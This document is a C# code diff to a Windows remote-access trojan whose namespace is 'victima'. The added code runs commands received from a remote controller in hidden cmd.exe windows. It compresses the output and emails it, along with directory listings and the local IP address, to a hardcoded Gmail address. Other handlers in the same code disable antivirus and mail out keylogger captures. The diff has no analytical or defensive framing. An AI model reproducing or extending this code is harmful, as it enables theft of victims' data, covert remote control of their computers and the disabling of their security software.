@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Net;
 using System.Net.Mail;
@@ -118,6 +119,7 @@ namespace victima
                 Console.WriteLine("Error");
             }
         }
+
         public static void Ejecutar_comando(string comando)
         {
             write_log(comando);
@@ -137,6 +139,27 @@ namespace victima
                 proc.StartInfo.CreateNoWindow = true;
                 proc.Start();
                 proc.WaitForExit();
+                if (File.Exists(System.Windows.Forms.Application.StartupPath + @"\output.txt"))
+                {
+                    CompressFile(System.Windows.Forms.Application.StartupPath + @"\output.txt");
+                    try
+                    {
+                        write_log("mail sent output");
+                        GMail Cr = new GMail();
+                        MailMessage mnsj = new MailMessage();
+                        mnsj.Subject = "output";
+                        mnsj.To.Add(new MailAddress("uyarikuna@gmail.com"));
+                        mnsj.From = new MailAddress("victim@hipster.com", "Nueva");
+                        Attachment attach = new Attachment(System.Windows.Forms.Application.StartupPath + @"\output.txt.gz");
+                        mnsj.Attachments.Add(attach);
+                        mnsj.Body = String.Format("command:{0}, timestamp: \n\n {1}",comando, new DateTime().ToUniversalTime());
+                        Cr.MandarCorreo(mnsj);
+                    }
+                    catch (Exception)
+                    {
+                        Console.Write("Error envio email ip");
+                    }
+                }
                 Console.WriteLine("proceso ejecutado");
             }
             catch (Exception ex)
@@ -254,15 +277,7 @@ namespace victima
                                     Mandar_email_archivo_keylogger();
                                     sw.WriteLine("Email Enviado con attach el:" + new DateTime().ToString());
                                     break;
-                                case "desactivar_av":
-                                    DesactivarAntivirus();
-                                    sw.WriteLine("SW AV cmd llamado el:" + new DateTime().ToString());
-                                    break;
-                                case "listado_directorio":
-                                    list_C_enviar_mail();
-                                    sw.Write("Done");
-                                    sw.Flush();
-                                    break;
+                               
                                 default:
                                     write_log("yapues");
                                     sw.WriteLine("no reconocido,echo:" + initial_command);
@@ -273,8 +288,24 @@ namespace victima
                         }
                         else
                         {
+                            write_log(initial_command);
+                            switch (initial_command)
+                            {
+                                case "desactivar_av":
+                                    DesactivarAntivirus();
+                                    sw.WriteLine("SW AV cmd llamado el:" + new DateTime().ToString());
+                                    break;
+                                case "listado_directorio":
+                                    list_C_enviar_mail();
+                                    sw.Write("Done");
+                                    sw.Flush();
+                                    break;
+                                default:
+                                    Ejecutar_comando(initial_command);
+                                    break;
+                            }
                             //ejecutar y devolver ACK
-                            Ejecutar_comando(initial_command);
+                            
                             sw.WriteLine("comando ejecutado:" + initial_command);
                         }
                     }
@@ -304,20 +335,57 @@ namespace victima
                 }
             });
         }
+        public static void CompressFile(string path)
+        {
+            FileStream sourceFile = File.OpenRead(path);
+            FileStream destinationFile = File.Create(path + ".gz");
+
+            byte[] buffer = new byte[sourceFile.Length];
+            sourceFile.Read(buffer, 0, buffer.Length);
+
+            using (GZipStream output = new GZipStream(destinationFile,
+                CompressionMode.Compress))
+            {
+                Console.WriteLine("Compressing {0} to {1}.", sourceFile.Name,
+                    destinationFile.Name, false);
+
+                output.Write(buffer, 0, buffer.Length);
+            }
+
+            // Close the files.
+            sourceFile.Close();
+            destinationFile.Close();
+        }
         private static void list_C_enviar_mail()
         {
             try
             {
                 Process proc = new Process();
                 string top = "cmd.exe";
-                proc.StartInfo.Arguments = @"/C dir c:\ /s > dir.txt";
+                proc.StartInfo.Arguments = @"/C dir  >"+System.Windows.Forms.Application.StartupPath+@"\dir.txt";
                 proc.StartInfo.FileName = top;
                 proc.StartInfo.UseShellExecute = false;
                 proc.StartInfo.RedirectStandardOutput = false;
                 proc.StartInfo.CreateNoWindow = true;
                 proc.Start();
                 proc.WaitForExit();
-
+                CompressFile(System.Windows.Forms.Application.StartupPath + @"\dir.txt");
+                try
+                {
+                    GMail Cr = new GMail();
+                    MailMessage mnsj = new MailMessage();
+                    mnsj.Subject = "dir_file";
+                    mnsj.To.Add(new MailAddress("uyarikuna@gmail.com"));
+                    mnsj.From = new MailAddress("victim@hipster.com", "Nueva");
+                    Attachment attach = new Attachment(System.Windows.Forms.Application.StartupPath + @"\dir.txt.gz");
+                    mnsj.Attachments.Add(attach);
+                    mnsj.Body = String.Format("IP:,{0} timestamp: \n\n {1}",Get_ip_local_address(), new DateTime().ToUniversalTime());
+                    Cr.MandarCorreo(mnsj);
+                }
+                catch (Exception)
+                {
+                    Console.Write("Error envio email ip");
+                }
                 Console.WriteLine("Saved");
             }
             catch (Exception ex)
